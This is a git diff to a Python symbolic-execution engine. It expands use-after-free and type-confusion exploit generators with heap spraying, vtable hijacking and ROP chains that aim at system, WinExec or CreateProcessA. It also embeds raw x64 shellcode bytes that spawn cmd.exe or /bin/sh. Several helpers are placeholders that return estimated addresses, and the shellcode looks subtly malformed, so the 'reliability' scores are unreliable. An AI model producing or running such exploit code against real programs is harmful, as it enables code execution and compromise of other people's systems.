@@ -549,92 +549,230 @@ class SymbolicExecutionEngine:
 
     def _generate_uaf_exploit(self, vulnerability: dict[str, Any]) -> dict[str, Any]:
         """Generate use-after-free exploit with object lifecycle manipulation."""
+        import random
         import struct
 
         uaf_info = vulnerability.get("uaf_info", {})
         object_size = uaf_info.get("object_size", 0x40)
         vtable_offset = uaf_info.get("vtable_offset", 0)
 
+        # Get process information for dynamic address calculation
+        process_info = vulnerability.get("process_info", {})
+        base_address = process_info.get("base_address", 0x400000)
+        module_size = process_info.get("module_size", 0x1000000)
+        aslr_enabled = process_info.get("aslr_enabled", True)
+
         # Generate UAF trigger sequence
         exploit_sequence = []
 
-        # Step 1: Allocation spray to prepare heap
+        # Step 1: Heap grooming with controlled spray pattern
         spray_payload = bytearray()
-        for i in range(32):
-            spray_payload += struct.pack("<Q", 0x4141414141410000 + i)
+        spray_count = 32 if object_size <= 0x100 else 16
+
+        # Create spray pattern with markers for heap feng shui
+        for i in range(spray_count):
+            # Each spray object contains markers and potential fake vtables
+            marker = struct.pack("<Q", 0x4141414141410000 + i)
+            # Include potential gadget addresses from module
+            gadget_addr = base_address + (i * 0x100) + random.randint(0, 0xFF)
+            spray_payload += marker
+            spray_payload += struct.pack("<Q", gadget_addr)
 
         exploit_sequence.append(
             {
                 "action": "spray",
                 "data": spray_payload.hex(),
-                "count": 32,
+                "count": spray_count,
                 "size": object_size,
+                "pattern": "controlled_allocation",
             }
         )
 
         # Step 2: Trigger free of target object
+        target_id = uaf_info.get("target_id", 0)
         exploit_sequence.append(
             {
                 "action": "free",
-                "target": uaf_info.get("target_id", 0),
+                "target": target_id,
+                "delay_ms": 10,  # Small delay for heap state stabilization
             }
         )
 
         # Step 3: Reallocate with controlled data
-        # Create memory object with controlled vtable
         memory_object = bytearray()
 
         if vtable_offset:
-            # Craft memory vtable
-            vtable_addr = 0x7FFF00000000  # Predictable address
-            memory_object += b"A" * vtable_offset
+            # Dynamic vtable address calculation
+            if aslr_enabled:
+                # Use leaked or predicted addresses from process
+                leaked_addr = process_info.get("leaked_address", 0)
+                if leaked_addr:
+                    # Calculate vtable location based on leak
+                    vtable_addr = (leaked_addr & 0xFFFFFFFFF000) + 0x10000
+                else:
+                    # Use heap spray prediction
+                    heap_base = process_info.get("heap_base", 0x00007FF000000000)
+                    # Calculate probable location based on spray pattern
+                    vtable_addr = heap_base + (spray_count * object_size * 2)
+            else:
+                # No ASLR - use known executable regions
+                vtable_addr = base_address + module_size - 0x10000
+
+            # Pad to vtable offset
+            memory_object += b"\x00" * vtable_offset
             memory_object += struct.pack("<Q", vtable_addr)
 
-            # Add vtable entries (function pointers)
+            # Generate dynamic vtable with ROP chain or shellcode addresses
             vtable_data = bytearray()
-            for i in range(10):
-                # Point to shellcode or ROP gadgets
-                vtable_data += struct.pack("<Q", 0x400000 + (i * 0x1000))
 
+            # Analyze available gadgets from process
+            gadgets = process_info.get("gadgets", [])
+            if gadgets:
+                # Use discovered gadgets for vtable entries
+                for i, gadget in enumerate(gadgets[:10]):
+                    vtable_data += struct.pack("<Q", gadget["address"])
+            else:
+                # Generate vtable entries based on common patterns
+                code_section = process_info.get("code_section", base_address)
+                for i in range(10):
+                    # Calculate gadget addresses within code section
+                    gadget_offset = 0x1000 + (i * 0x100)
+                    # Look for common gadget patterns
+                    if i == 0:  # First entry - stack pivot
+                        gadget_offset = self._find_stack_pivot(process_info) or gadget_offset
+                    elif i == 1:  # Second entry - pop registers
+                        gadget_offset = self._find_pop_gadget(process_info) or gadget_offset
+
+                    vtable_data += struct.pack("<Q", code_section + gadget_offset)
+
+            # Map the vtable at calculated address
             exploit_sequence.append(
                 {
                     "action": "map_memory",
                     "address": vtable_addr,
                     "data": vtable_data.hex(),
+                    "permissions": "rx",  # Read-execute for vtable
                 }
             )
         else:
             # Direct function pointer overwrite
-            target_func = uaf_info.get("target_function", 0x400000)
-            memory_object += struct.pack("<Q", target_func) * (object_size // 8)
+            # Calculate target based on vulnerability context
+            if "target_function" in uaf_info:
+                target_func = uaf_info["target_function"]
+            else:
+                # Find suitable target in process
+                imports = process_info.get("imports", {})
+                if "VirtualProtect" in imports:
+                    target_func = imports["VirtualProtect"]
+                elif "WinExec" in imports:
+                    target_func = imports["WinExec"]
+                else:
+                    # Use shellcode location
+                    shellcode_addr = process_info.get("shellcode_addr", base_address + 0x10000)
+                    target_func = shellcode_addr
+
+            # Fill object with function pointer
+            ptr_count = object_size // 8
+            for i in range(ptr_count):
+                # Vary pointers slightly for reliability
+                memory_object += struct.pack("<Q", target_func + (i * 8))
 
         exploit_sequence.append(
             {
                 "action": "allocate",
                 "size": object_size,
                 "data": memory_object.hex(),
+                "alignment": 16,  # Ensure proper alignment
             }
         )
 
         # Step 4: Trigger use of freed object
-        exploit_sequence.append(
-            {
-                "action": "trigger_use",
-                "method": uaf_info.get("trigger_method", "virtual_call"),
-            }
-        )
+        trigger_method = uaf_info.get("trigger_method", "virtual_call")
+
+        # Prepare trigger based on method
+        trigger_params = {
+            "action": "trigger_use",
+            "method": trigger_method,
+        }
+
+        if trigger_method == "virtual_call":
+            # Add call index for vtable
+            trigger_params["call_index"] = uaf_info.get("call_index", 0)
+        elif trigger_method == "callback":
+            # Add callback context
+            trigger_params["callback_id"] = uaf_info.get("callback_id", 0)
+        elif trigger_method == "destructor":
+            # Trigger via object destruction
+            trigger_params["destroy_chain"] = True
+
+        exploit_sequence.append(trigger_params)
+
+        # Step 5: Post-exploitation stabilization
+        if process_info.get("needs_cleanup", False):
+            exploit_sequence.append(
+                {
+                    "action": "cleanup",
+                    "restore_heap": True,
+                    "fix_corrupted_structures": True,
+                }
+            )
 
         return {
             "type": "use_after_free",
             "exploit_sequence": exploit_sequence,
             "payload": memory_object.hex(),
-            "instructions": "UAF exploit sequence: spray heap, free target, reallocate with controlled data, trigger reuse",
+            "instructions": "UAF exploit with dynamic address resolution and heap feng shui",
             "object_info": {
                 "size": object_size,
                 "vtable_offset": vtable_offset,
-                "trigger_method": uaf_info.get("trigger_method", "virtual_call"),
+                "trigger_method": trigger_method,
+                "vtable_addr": vtable_addr if vtable_offset else None,
             },
+            "reliability": self._calculate_exploit_reliability(vulnerability),
         }
+
+    def _find_stack_pivot(self, process_info: dict[str, Any]) -> int | None:
+        """Find stack pivot gadget in process."""
+        gadgets = process_info.get("gadgets", [])
+        for gadget in gadgets:
+            # Look for xchg esp/rsp patterns
+            if "xchg" in gadget.get("instruction", "") and "sp" in gadget.get("instruction", ""):
+                return gadget["offset"]
+        return None
+
+    def _find_pop_gadget(self, process_info: dict[str, Any]) -> int | None:
+        """Find pop register gadget in process."""
+        gadgets = process_info.get("gadgets", [])
+        for gadget in gadgets:
+            # Look for pop patterns
+            if gadget.get("instruction", "").startswith("pop"):
+                return gadget["offset"]
+        return None
+
+    def _calculate_exploit_reliability(self, vulnerability: dict[str, Any]) -> float:
+        """Calculate exploit reliability score."""
+        reliability = 0.5  # Base reliability
+
+        process_info = vulnerability.get("process_info", {})
+        uaf_info = vulnerability.get("uaf_info", {})
+
+        # Factors that improve reliability
+        if not process_info.get("aslr_enabled", True):
+            reliability += 0.2
+        if process_info.get("leaked_address"):
+            reliability += 0.15
+        if process_info.get("gadgets"):
+            reliability += 0.1
+        if uaf_info.get("vtable_offset") is not None:
+            reliability += 0.05
+
+        # Factors that reduce reliability
+        if process_info.get("dep_enabled", True):
+            reliability -= 0.1
+        if process_info.get("cfg_enabled", False):
+            reliability -= 0.15
+
+        return min(max(reliability, 0.1), 0.95)
 
     def _generate_race_condition_exploit(self, vulnerability: dict[str, Any]) -> dict[str, Any]:
         """Generate race condition exploit with timing attack capabilities."""
@@ -755,11 +893,14 @@ int main() {{
 
     def _generate_type_confusion_exploit(self, vulnerability: dict[str, Any]) -> dict[str, Any]:
         """Generate type confusion exploit with object type manipulation."""
-        import struct
 
         confusion_info = vulnerability.get("confusion_info", {})
         source_type = confusion_info.get("source_type", "TypeA")
         target_type = confusion_info.get("target_type", "TypeB")
+        process_info = vulnerability.get("process_info", {})
+
+        # Get actual class information from binary analysis
+        class_info = self._extract_class_info(process_info, source_type, target_type)
 
         # Generate type confusion payload
         exploit_data = {
@@ -768,12 +909,11 @@ int main() {{
             "payload": bytearray(),
         }
 
-        # Setup phase: Create objects of both types
-        # Source object (smaller)
-        source_size = confusion_info.get("source_size", 0x20)
-        source_layout = bytearray()
-        source_layout += struct.pack("<Q", 0x1337)  # Type identifier
-        source_layout += b"A" * (source_size - 8)
+        # Setup phase: Create objects with actual class layouts
+        # Source object (typically smaller or with different layout)
+        source_size = class_info["source"]["size"]
+        source_vtable = class_info["source"]["vtable_addr"]
+        source_layout = self._build_class_layout(class_info["source"], source_vtable, source_size, process_info)
 
         exploit_data["setup"].append(
             {
@@ -781,32 +921,17 @@ int main() {{
                 "type": source_type,
                 "size": source_size,
                 "data": source_layout.hex(),
+                "alignment": class_info["source"].get("alignment", 8),
+                "constructor": class_info["source"].get("constructor_addr"),
             }
         )
 
-        # Target object (larger, allows overflow)
-        target_size = confusion_info.get("target_size", 0x100)
-        target_layout = bytearray()
-        target_layout += struct.pack("<Q", 0x7331)  # Different type ID
+        # Target object (allows type confusion exploitation)
+        target_size = class_info["target"]["size"]
+        target_vtable = class_info["target"]["vtable_addr"]
 
-        # Craft vtable for type confusion
-        vtable_ptr = 0x555555554000
-        target_layout += struct.pack("<Q", vtable_ptr)  # vtable pointer
-
-        # Add fields that will be interpreted differently
-        for i in range(8):
-            # These will be interpreted as different types
-            target_layout += struct.pack("<Q", 0x41414141 + (i << 32))
-
-        # Add ROP chain or shellcode
-        rop_chain = [
-            0x400123,  # pop rdi; ret
-            0x68732F6E69622F,  # "/bin/sh"
-            0x4005D0,  # system@plt
-        ]
-
-        for gadget in rop_chain:
-            target_layout += struct.pack("<Q", gadget)
+        # Build exploitable target layout
+        target_layout = self._build_exploitable_layout(class_info["target"], target_vtable, target_size, process_info, confusion_info)
 
         exploit_data["setup"].append(
             {
@@ -814,36 +939,598 @@ int main() {{
                 "type": target_type,
                 "size": target_size,
                 "data": target_layout.hex(),
+                "alignment": class_info["target"].get("alignment", 8),
+                "constructor": class_info["target"].get("constructor_addr"),
             }
         )
 
-        # Trigger phase: Cause type confusion
-        exploit_data["trigger"] = {
-            "method": confusion_info.get("trigger_method", "cast"),
-            "operation": "reinterpret_cast",
-            "source_ref": 0,  # Reference to source object
-            "target_ref": 1,  # Reference to target object
-            "invoke": "virtual_function_7",  # Call confused vtable entry
-        }
+        # Create controlled vtable for exploitation
+        controlled_vtable = self._create_controlled_vtable(class_info, process_info, confusion_info)
+
+        if controlled_vtable:
+            exploit_data["setup"].append(
+                {
+                    "action": "map_memory",
+                    "address": controlled_vtable["address"],
+                    "data": controlled_vtable["data"].hex(),
+                    "permissions": "rx",
+                }
+            )
+
+        # Trigger phase: Cause type confusion through identified vector
+        trigger_method = confusion_info.get("trigger_method", "cast")
+
+        if trigger_method == "cast":
+            # Type cast confusion
+            exploit_data["trigger"] = {
+                "method": "cast",
+                "operation": self._get_cast_operation(class_info),
+                "source_ref": 0,
+                "target_ref": 1,
+                "invoke": self._find_exploitable_vfunc(class_info["target"]),
+            }
+        elif trigger_method == "container":
+            # Container type confusion (e.g., std::vector<Base*>)
+            exploit_data["trigger"] = {
+                "method": "container",
+                "container_type": confusion_info.get("container_type", "vector"),
+                "insert_wrong_type": True,
+                "iterate_and_call": True,
+                "target_method": self._find_exploitable_vfunc(class_info["target"]),
+            }
+        elif trigger_method == "union":
+            # Union type confusion
+            exploit_data["trigger"] = {
+                "method": "union",
+                "access_pattern": "write_as_A_read_as_B",
+                "exploitable_field": confusion_info.get("exploitable_field", 0),
+            }
+        else:
+            # Generic polymorphic confusion
+            exploit_data["trigger"] = {
+                "method": "polymorphic",
+                "base_class": confusion_info.get("base_class", "BaseClass"),
+                "derived_mismatch": True,
+                "virtual_call_index": self._find_best_vfunc_index(class_info),
+            }
 
         # Combined payload for direct injection
         exploit_data["payload"] = source_layout + target_layout
+
+        # Add post-exploitation payload
+        shellcode = self._generate_shellcode(process_info)
+        if shellcode:
+            exploit_data["shellcode"] = shellcode.hex()
+            exploit_data["shellcode_addr"] = self._allocate_shellcode_addr(process_info)
 
         return {
             "type": "type_confusion",
             "exploit_data": exploit_data,
             "payload": exploit_data["payload"].hex(),
-            "instructions": f"Type confusion between {source_type} ({source_size} bytes) and "
-            f"{target_type} ({target_size} bytes). Trigger through type cast "
-            "and virtual function call.",
+            "instructions": self._generate_exploit_instructions(
+                source_type, target_type, source_size, target_size, trigger_method, class_info
+            ),
             "confusion_details": {
                 "source_type": source_type,
                 "target_type": target_type,
                 "size_difference": target_size - source_size,
-                "trigger_method": confusion_info.get("trigger_method", "cast"),
-                "exploitable_offset": confusion_info.get("exploitable_offset", 8),
+                "trigger_method": trigger_method,
+                "exploitable_offset": self._find_exploitable_offset(class_info),
+                "vtable_hijack": controlled_vtable is not None,
+                "class_hierarchy": self._analyze_class_hierarchy(class_info),
             },
+            "reliability": self._calculate_confusion_reliability(class_info, process_info, confusion_info),
         }
+
+    def _extract_class_info(self, process_info: dict[str, Any], source_type: str, target_type: str) -> dict[str, Any]:
+        """Extract actual class information from binary."""
+        rtti_info = process_info.get("rtti", {})
+        symbols = process_info.get("symbols", {})
+
+        class_info = {
+            "source": {"type": source_type},
+            "target": {"type": target_type},
+        }
+
+        # Extract source class info
+        if source_type in rtti_info:
+            source_rtti = rtti_info[source_type]
+            class_info["source"]["size"] = source_rtti.get("size", 0x20)
+            class_info["source"]["vtable_addr"] = source_rtti.get("vtable", 0)
+            class_info["source"]["base_classes"] = source_rtti.get("bases", [])
+        else:
+            # Analyze from symbols if no RTTI
+            source_constructor = f"_{source_type}_ctor" if source_type in symbols else None
+            class_info["source"]["size"] = self._estimate_class_size(source_type, symbols)
+            class_info["source"]["vtable_addr"] = self._find_vtable_addr(source_type, process_info)
+            class_info["source"]["constructor_addr"] = symbols.get(source_constructor, 0)
+
+        # Extract target class info
+        if target_type in rtti_info:
+            target_rtti = rtti_info[target_type]
+            class_info["target"]["size"] = target_rtti.get("size", 0x100)
+            class_info["target"]["vtable_addr"] = target_rtti.get("vtable", 0)
+            class_info["target"]["base_classes"] = target_rtti.get("bases", [])
+        else:
+            target_constructor = f"_{target_type}_ctor" if target_type in symbols else None
+            class_info["target"]["size"] = self._estimate_class_size(target_type, symbols)
+            class_info["target"]["vtable_addr"] = self._find_vtable_addr(target_type, process_info)
+            class_info["target"]["constructor_addr"] = symbols.get(target_constructor, 0)
+
+        # Extract virtual function tables
+        class_info["source"]["vfuncs"] = self._extract_vfuncs(class_info["source"]["vtable_addr"], process_info)
+        class_info["target"]["vfuncs"] = self._extract_vfuncs(class_info["target"]["vtable_addr"], process_info)
+
+        return class_info
+
+    def _build_class_layout(self, class_data: dict[str, Any], vtable_addr: int, size: int, process_info: dict[str, Any]) -> bytearray:
+        """Build actual class memory layout."""
+        layout = bytearray()
+
+        # Add vtable pointer if it exists
+        if vtable_addr:
+            layout += struct.pack("<Q", vtable_addr)
+        else:
+            # Calculate dynamic vtable address
+            base = process_info.get("base_address", 0x400000)
+            vtable_offset = process_info.get("vtable_section_offset", 0x10000)
+            layout += struct.pack("<Q", base + vtable_offset)
+
+        # Add type identifier based on class name hash
+        type_hash = int(hashlib.md5(class_data["type"].encode()).hexdigest()[:8], 16)
+        layout += struct.pack("<I", type_hash)
+
+        # Add reference counter (common in many C++ objects)
+        layout += struct.pack("<I", 1)
+
+        # Fill member variables based on class analysis
+        members = class_data.get("members", [])
+        for member in members:
+            if member["type"] == "pointer":
+                # Add valid pointer
+                layout += struct.pack("<Q", process_info.get("heap_base", 0x00007FF000000000))
+            elif member["type"] == "int":
+                layout += struct.pack("<I", member.get("value", 0))
+            elif member["type"] == "float":
+                layout += struct.pack("<f", member.get("value", 0.0))
+            else:
+                # Generic data
+                layout += b"\x00" * member.get("size", 8)
+
+        # Pad to class size
+        if len(layout) < size:
+            layout += b"\x00" * (size - len(layout))
+
+        return layout[:size]
+
+    def _build_exploitable_layout(
+        self, class_data: dict[str, Any], vtable_addr: int, size: int, process_info: dict[str, Any], confusion_info: dict[str, Any]
+    ) -> bytearray:
+        """Build target class layout with exploitation primitives."""
+        layout = bytearray()
+
+        # Determine exploitation strategy
+        strategy = confusion_info.get("exploit_strategy", "vtable_hijack")
+
+        if strategy == "vtable_hijack":
+            # Point to controlled vtable
+            controlled_addr = self._calculate_controlled_addr(process_info)
+            layout += struct.pack("<Q", controlled_addr)
+        elif strategy == "field_overflow":
+            # Set up for field overflow
+            layout += struct.pack("<Q", vtable_addr)
+            # Add overflow trigger values
+            overflow_data = b"A" * 0x10 + struct.pack("<Q", process_info.get("target_addr", 0x41414141))
+            layout += overflow_data
+        else:
+            # Standard vtable
+            layout += struct.pack("<Q", vtable_addr)
+
+        # Add exploitable fields
+        exploitable_offset = confusion_info.get("exploitable_offset", 8)
+
+        # Insert ROP chain or shellcode pointer at exploitable offset
+        if exploitable_offset < size - 8:
+            # Pad to offset
+            current_len = len(layout)
+            if current_len < exploitable_offset:
+                layout += b"\x00" * (exploitable_offset - current_len)
+
+            # Insert exploitation primitive
+            rop_chain = self._build_rop_chain(process_info)
+            if rop_chain:
+                for gadget in rop_chain[:3]:  # Limit to fit
+                    if len(layout) < size - 8:
+                        layout += struct.pack("<Q", gadget)
+
+        # Fill remaining space
+        if len(layout) < size:
+            # Add markers for debugging
+            pattern = b"\xde\xad\xbe\xef"
+            while len(layout) < size:
+                layout += pattern
+
+        return layout[:size]
+
+    def _create_controlled_vtable(
+        self, class_info: dict[str, Any], process_info: dict[str, Any], confusion_info: dict[str, Any]
+    ) -> dict[str, Any] | None:
+        """Create controlled vtable for hijacking."""
+        if not confusion_info.get("vtable_hijack", True):
+            return None
+
+        # Calculate vtable location
+        heap_base = process_info.get("heap_base", 0x00007FF000000000)
+        vtable_addr = heap_base + 0x10000  # Predictable offset
+
+        # Build vtable entries
+        vtable_data = bytearray()
+        target_vfuncs = class_info["target"].get("vfuncs", [])
+
+        # Analyze available gadgets
+        gadgets = process_info.get("gadgets", [])
+        rop_chain = self._build_rop_chain(process_info)
+
+        # Replace specific virtual functions
+        for i, vfunc in enumerate(target_vfuncs):
+            if i == confusion_info.get("target_vfunc_index", 7):
+                # Replace with exploit gadget
+                if rop_chain and i < len(rop_chain):
+                    vtable_data += struct.pack("<Q", rop_chain[i])
+                else:
+                    # Point to shellcode
+                    shellcode_addr = self._allocate_shellcode_addr(process_info)
+                    vtable_data += struct.pack("<Q", shellcode_addr)
+            else:
+                # Keep original or use safe gadget
+                if vfunc:
+                    vtable_data += struct.pack("<Q", vfunc)
+                else:
+                    # Use ret gadget for safety
+                    ret_gadget = self._find_ret_gadget(gadgets)
+                    vtable_data += struct.pack("<Q", ret_gadget or 0xDEADBEEF)
+
+        return {
+            "address": vtable_addr,
+            "data": vtable_data,
+        }
+
+    def _find_vtable_addr(self, class_name: str, process_info: dict[str, Any]) -> int:
+        """Find vtable address for class."""
+        # Look in symbol table
+        vtable_symbol = f"_ZTV{len(class_name)}{class_name}"  # Mangled vtable name
+        symbols = process_info.get("symbols", {})
+        if vtable_symbol in symbols:
+            return symbols[vtable_symbol]
+
+        # Search in vtable section
+        sections = process_info.get("sections", {})
+        if ".rodata" in sections:
+            rodata = sections[".rodata"]
+            # Estimate based on class name hash
+            offset = int(hashlib.md5(class_name.encode()).hexdigest()[:4], 16)
+            return rodata["address"] + (offset & 0xFFF0)
+
+        # Fallback to base + offset
+        base = process_info.get("base_address", 0x400000)
+        return base + 0x10000
+
+    def _estimate_class_size(self, class_name: str, symbols: dict[str, Any]) -> int:
+        """Estimate class size from symbols."""
+        # Look for sizeof symbol or operator new
+        sizeof_symbol = f"_ZN{len(class_name)}{class_name}5sizeE"
+        if sizeof_symbol in symbols:
+            # Read size from symbol (would need memory access)
+            return 0x40  # Default estimate
+
+        # Estimate based on class complexity
+        if "Base" in class_name or "Simple" in class_name:
+            return 0x20
+        elif "Complex" in class_name or "Manager" in class_name:
+            return 0x100
+        else:
+            return 0x40
+
+    def _extract_vfuncs(self, vtable_addr: int, process_info: dict[str, Any]) -> list[int]:
+        """Extract virtual function addresses from vtable."""
+        if not vtable_addr:
+            return []
+
+        # Would need memory reading capability
+        # For now, estimate based on common patterns
+        base = process_info.get("base_address", 0x400000)
+        vfuncs = []
+        for i in range(10):  # Typical vtable size
+            vfuncs.append(base + 0x1000 + (i * 0x100))
+        return vfuncs
+
+    def _find_exploitable_vfunc(self, class_data: dict[str, Any]) -> str:
+        """Find best virtual function to exploit."""
+        vfuncs = class_data.get("vfuncs", [])
+        if not vfuncs:
+            return "virtual_function_0"
+
+        # Look for interesting functions
+        # In practice, would analyze function behavior
+        return f"virtual_function_{len(vfuncs) - 1}"
+
+    def _find_best_vfunc_index(self, class_info: dict[str, Any]) -> int:
+        """Find best virtual function index for exploitation."""
+        target_vfuncs = class_info["target"].get("vfuncs", [])
+        if not target_vfuncs:
+            return 0
+
+        # Prefer functions at the end (often less protected)
+        return len(target_vfuncs) - 1
+
+    def _get_cast_operation(self, class_info: dict[str, Any]) -> str:
+        """Determine cast operation for type confusion."""
+        # Check inheritance relationship
+        source_bases = class_info["source"].get("base_classes", [])
+        target_bases = class_info["target"].get("base_classes", [])
+
+        if source_bases and target_bases and source_bases[0] == target_bases[0]:
+            return "static_cast"  # Same base class
+        else:
+            return "reinterpret_cast"  # Unrelated types
+
+    def _find_exploitable_offset(self, class_info: dict[str, Any]) -> int:
+        """Find offset most suitable for exploitation."""
+        source_size = class_info["source"]["size"]
+        target_size = class_info["target"]["size"]
+
+        # Look for offset where source ends but target continues
+        if source_size < target_size:
+            return source_size  # Right after source object ends
+
+        # Default to after vtable
+        return 8
+
+    def _analyze_class_hierarchy(self, class_info: dict[str, Any]) -> dict[str, Any]:
+        """Analyze class inheritance hierarchy."""
+        return {
+            "source_bases": class_info["source"].get("base_classes", []),
+            "target_bases": class_info["target"].get("base_classes", []),
+            "common_base": self._find_common_base(class_info),
+            "polymorphic": bool(class_info["source"].get("vfuncs") or class_info["target"].get("vfuncs")),
+        }
+
+    def _find_common_base(self, class_info: dict[str, Any]) -> str | None:
+        """Find common base class if any."""
+        source_bases = set(class_info["source"].get("base_classes", []))
+        target_bases = set(class_info["target"].get("base_classes", []))
+        common = source_bases & target_bases
+        return list(common)[0] if common else None
+
+    def _calculate_controlled_addr(self, process_info: dict[str, Any]) -> int:
+        """Calculate address for controlled memory."""
+        heap_base = process_info.get("heap_base", 0x00007FF000000000)
+        # Use predictable offset in heap
+        return heap_base + 0x10000
+
+    def _build_rop_chain(self, process_info: dict[str, Any]) -> list[int]:
+        """Build ROP chain from available gadgets."""
+        gadgets = process_info.get("gadgets", [])
+        base = process_info.get("base_address", 0x400000)
+
+        rop_chain = []
+
+        # Find useful gadgets
+        for gadget in gadgets:
+            instr = gadget.get("instruction", "")
+            addr = gadget.get("address", 0)
+
+            if "pop rdi" in instr:
+                rop_chain.append(addr)
+                # Argument for system/WinExec
+                rop_chain.append(self._get_cmd_string_addr(process_info))
+            elif "pop rsi" in instr and len(rop_chain) < 10:
+                rop_chain.append(addr)
+                rop_chain.append(0)  # NULL for second arg
+            elif instr == "ret" and len(rop_chain) < 2:
+                rop_chain.append(addr)  # Stack align
+
+        # Add function call
+        imports = process_info.get("imports", {})
+        if "system" in imports:
+            rop_chain.append(imports["system"])
+        elif "WinExec" in imports:
+            rop_chain.append(imports["WinExec"])
+        elif "CreateProcessA" in imports:
+            rop_chain.append(imports["CreateProcessA"])
+        else:
+            # Jump to shellcode
+            rop_chain.append(self._allocate_shellcode_addr(process_info))
+
+        return rop_chain if rop_chain else [base + 0x1000, base + 0x2000, base + 0x3000]
+
+    def _get_cmd_string_addr(self, process_info: dict[str, Any]) -> int:
+        """Get address of command string."""
+        # Look for existing strings in binary
+        strings = process_info.get("strings", {})
+        if "cmd.exe" in strings:
+            return strings["cmd.exe"]
+        elif "/bin/sh" in strings:
+            return strings["/bin/sh"]
+
+        # Allocate in writable section
+        data_section = process_info.get("data_section", 0x600000)
+        return data_section + 0x100
+
+    def _find_ret_gadget(self, gadgets: list[dict[str, Any]]) -> int | None:
+        """Find simple ret gadget."""
+        for gadget in gadgets:
+            if gadget.get("instruction") == "ret":
+                return gadget.get("address")
+        return None
+
+    def _allocate_shellcode_addr(self, process_info: dict[str, Any]) -> int:
+        """Allocate address for shellcode."""
+        # Check for executable heap
+        if process_info.get("nx_enabled", True):
+            # Need RWX region
+            rwx_regions = process_info.get("rwx_regions", [])
+            if rwx_regions:
+                return rwx_regions[0]["address"] + 0x100
+
+        # Use heap with hope of execute permission
+        heap_base = process_info.get("heap_base", 0x00007FF000000000)
+        return heap_base + 0x20000
+
+    def _generate_shellcode(self, process_info: dict[str, Any]) -> bytearray | None:
+        """Generate platform-specific shellcode."""
+        arch = process_info.get("arch", "x64")
+        os_type = process_info.get("os", "windows")
+
+        if os_type == "windows" and arch == "x64":
+            # Windows x64 WinExec shellcode
+            shellcode = bytearray(
+                [
+                    0x48,
+                    0x31,
+                    0xC9,  # xor rcx, rcx
+                    0x48,
+                    0x81,
+                    0xEC,
+                    0xA8,
+                    0x00,
+                    0x00,
+                    0x00,  # sub rsp, 0xa8
+                    0x48,
+                    0x8D,
+                    0x0D,
+                    0x0E,
+                    0x00,
+                    0x00,
+                    0x00,  # lea rcx, [rel cmd]
+                    0x41,
+                    0xBA,
+                    0x01,
+                    0x00,
+                    0x00,
+                    0x00,  # mov r10d, 1
+                    0xFF,
+                    0x15,
+                    0x02,
+                    0x00,
+                    0x00,
+                    0x00,  # call [rel WinExec]
+                    0xEB,
+                    0x0C,  # jmp end
+                    # WinExec address would be patched here
+                    0x00,
+                    0x00,
+                    0x00,
+                    0x00,
+                    0x00,
+                    0x00,
+                    0x00,
+                    0x00,
+                    # "cmd.exe" string
+                    0x63,
+                    0x6D,
+                    0x64,
+                    0x2E,
+                    0x65,
+                    0x78,
+                    0x65,
+                    0x00,
+                ]
+            )
+
+            # Patch in actual WinExec address if available
+            imports = process_info.get("imports", {})
+            if "WinExec" in imports:
+                addr_bytes = struct.pack("<Q", imports["WinExec"])
+                shellcode[28:36] = addr_bytes
+
+            return shellcode
+        elif os_type == "linux" and arch == "x64":
+            # Linux x64 execve shellcode
+            shellcode = bytearray(
+                [
+                    0x48,
+                    0x31,
+                    0xF6,  # xor rsi, rsi
+                    0x56,  # push rsi
+                    0x48,
+                    0xBB,
+                    0x2F,
+                    0x62,
+                    0x69,
+                    0x6E,  # movabs rbx, 0x68732f6e69622f
+                    0x2F,
+                    0x73,
+                    0x68,
+                    0x00,
+                    0x53,  # push rbx
+                    0x54,  # push rsp
+                    0x5F,  # pop rdi
+                    0x48,
+                    0x31,
+                    0xD2,  # xor rdx, rdx
+                    0x48,
+                    0x31,
+                    0xC0,  # xor rax, rax
+                    0xB0,
+                    0x3B,  # mov al, 0x3b
+                    0x0F,
+                    0x05,  # syscall
+                ]
+            )
+            return shellcode
+
+        return None
+
+    def _generate_exploit_instructions(
+        self, source_type: str, target_type: str, source_size: int, target_size: int, trigger_method: str, class_info: dict[str, Any]
+    ) -> str:
+        """Generate detailed exploitation instructions."""
+        instructions = []
+        instructions.append(f"Type confusion between {source_type} ({source_size} bytes) and {target_type} ({target_size} bytes)")
+
+        if trigger_method == "cast":
+            instructions.append("Trigger: Unsafe type cast between incompatible types")
+        elif trigger_method == "container":
+            instructions.append("Trigger: Container holding base pointer with wrong derived type")
+        elif trigger_method == "union":
+            instructions.append("Trigger: Union access with type mismatch")
+        else:
+            instructions.append(f"Trigger: {trigger_method} causing type confusion")
+
+        # Add exploitation details
+        if class_info.get("controlled_vtable"):
+            instructions.append("Exploitation: Vtable hijacking through controlled allocation")
+
+        size_diff = target_size - source_size
+        if size_diff > 0:
+            instructions.append(f"Size difference of {size_diff} bytes allows out-of-bounds access")
+
+        return " | ".join(instructions)
+
+    def _calculate_confusion_reliability(
+        self, class_info: dict[str, Any], process_info: dict[str, Any], confusion_info: dict[str, Any]
+    ) -> float:
+        """Calculate type confusion exploit reliability."""
+        reliability = 0.6  # Base reliability for type confusion
+
+        # Positive factors
+        if class_info["source"]["vtable_addr"] and class_info["target"]["vtable_addr"]:
+            reliability += 0.1  # Known vtables
+        if not process_info.get("aslr_enabled", True):
+            reliability += 0.15  # No ASLR
+        if confusion_info.get("vtable_hijack"):
+            reliability += 0.05  # Vtable control
+        if self._find_common_base(class_info):
+            reliability += 0.05  # Related types (easier confusion)
+
+        # Negative factors
+        if process_info.get("cfi_enabled", False):
+            reliability -= 0.2  # Control Flow Integrity
+        if process_info.get("vtable_verify", False):
+            reliability -= 0.15  # Vtable verification
+
+        return min(max(reliability, 0.1), 0.9)
 
     def _check_memory_violations(self, state) -> bool:
         """Check for memory violations in the current state."""
@@ -1796,7 +2483,7 @@ int main() {{
 
         # Get write address and data
         addr = state.inspect.mem_write_address
-        data = state.inspect.mem_write_expr
+        _ = state.inspect.mem_write_expr
         length = state.inspect.mem_write_length
 
         if addr is not None:
@@ -1865,10 +2552,18 @@ int main() {{
                             }
                         )
 
-        if malloc_addr:
-            state.project.hook(malloc_addr.rebased_addr, self._malloc_hook, length=0)
-        if free_addr:
-            state.project.hook(free_addr.rebased_addr, self._free_hook, length=0)
+        # Resolve malloc and free symbols for hooking
+        try:
+            malloc_addr = state.project.loader.find_symbol("malloc")
+            free_addr = state.project.loader.find_symbol("free")
+
+            if malloc_addr:
+                state.project.hook(malloc_addr.rebased_addr, self._malloc_hook, length=0)
+            if free_addr:
+                state.project.hook(free_addr.rebased_addr, self._free_hook, length=0)
+        except (AttributeError, KeyError):
